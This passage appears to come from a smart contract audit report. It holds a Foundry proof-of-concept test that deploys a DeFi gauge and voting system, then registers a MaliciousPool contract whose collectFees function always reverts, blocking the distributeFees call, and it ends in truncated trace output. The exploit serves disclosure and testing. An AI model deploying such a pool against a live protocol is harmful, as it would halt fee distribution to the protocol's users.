ss deployer = makeAddr(\"deployer\");\n\n    address nfpm = makeAddr(\"nfpm\");\n    address art_proxy = makeAddr(\"art_proxy\");\n\nfunction setUp() public {\n    vm.startPrank(deployer);\n\n    // deploy mock token & ve\n    token = new MockERC20();\n    ve = new MockVotingEscrow(address(token));\n\n    // deploy permissions registry\n    permissionsRegistry = new PermissionsRegistry();\n\n    tokenHandler = new TokenHandler(address(permissionsRegistry));\n\n    // deploy and initialize gauge factories\n    gaugeFactoryCL = new GaugeFactoryCL();\n    gaugeFactoryCL.initialize(address(permissionsRegistry));\n\n    gaugeFactory = new GaugeFactory();\n    gaugeFactory.initialize(address(permissionsRegistry));\n\n    // deploy pair factory\n    pairFactory = new PairFactory();\n\n    // deploy and initialize gauge manager\n    gaugeManager = new GaugeManager();\n    gaugeManager.initialize(\n        address(ve),\n        address(tokenHandler),\n        address(gaugeFactory),\n        address(gaugeFactoryCL),\n        address(pairFactory),\n        address(pairFactory),\n        address(permissionsRegistry),\n        nfpm\n    );\n\n    tokenA = new MockERC20();\n    tokenB = new MockERC20();\n\n    voterV3 = new VoterV3();\n    voterV3.initialize(address(ve), address(tokenHandler), address(gaugeManager), address(permissionsRegistry));\n\n    bribeFactoryV3 = new BribeFactoryV3();\n    bribeFactoryV3.initialize(address(voterV3), address(gaugeManager), address(permissionsRegistry), address(tokenHandler));\n\n    votingEscrow = new VotingEscrow(address(tokenA), art_proxy);\n\n    rewardsDistributor = new RewardsDistributor(address(votingEscrow));\n\n    minterUpgradeable = new MinterUpgradeable();\n    minterUpgradeable.initialize(address(gaugeManager), address(ve), address(rewardsDistributor));\n\n    permissionsRegistry.setRoleFor(deployer, \"GENESIS_MANAGER\");\n    permissionsRegistry.setRoleFor(deployer, \"GOVERNANCE\");\n    permissionsRegistry.setRoleFor(deployer, \"GAUGE_ADMIN\");\n\n    tokenHandler.whitelistToken(address(tokenA));\n    tokenHandler.whitelistToken(address(tokenB));\n\n    tokenHandler.whitelistConnector(address(tokenA));\n    tokenHandler.whitelistConnector(address(tokenB));\n\n    gaugeManager.setBribeFactory(address(bribeFactoryV3));\n    gaugeManager.setMinter(address(minterUpgradeable));\n\n    vm.stopPrank();\n}\n\n    function test_PoC() public {\n        uint256 GAUGE_TYPE = 1;\n        \n        MaliciousPool maliciousPool = new MaliciousPool(address(tokenA), address(tokenB));\n        gaugeManager.createGauge(address(maliciousPool), GAUGE_TYPE);\n\n        vm.expectRevert();\n        gaugeManager.distributeFees(0, 3);\n    }\n}\n\ncontract MockVotingEscrow {\n    address public token;\n\n    constructor(address _token) {\n        token = _token;\n    }\n}\n\n// simple ERC20 mock token\ncontract MockERC20 is ERC20 {\n    constructor() ERC20(\"Mock Token\", \"MTK\") {\n        _mint(msg.sender, 1_000_000 ether);\n    }\n}\n\ncontract MaliciousPool {\n    address public token00;\n    address public token11;\n    address public gauge;\n    address public nft;\n\n    constructor(address _token0, address _token1) {\n        token00 = _token0;\n        token11 = _token1;\n    }\n\n    function token0() external view returns (address) {\n        return token00;\n    }\n\n    function token1() external view returns (address) {\n        return token11;\n    }\n\n    function setGaugeAndPositionManager(address _gauge, address _nft) external {\n    gauge = _gauge;\n    nft = _nft;\n    }\n\n    function collectFees() external returns (uint128 amount0, uint128 amount1) {\n        revert(\"You just got DoS'd!\");\n    }\n}\n\n```\nResult:\n```solidity\n    │   ├─ [2836309] GaugeFactoryCL::createGauge(MockERC20: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], MockVotingEscrow: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], MaliciousPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], GaugeManager: [0x13250CF16EEc777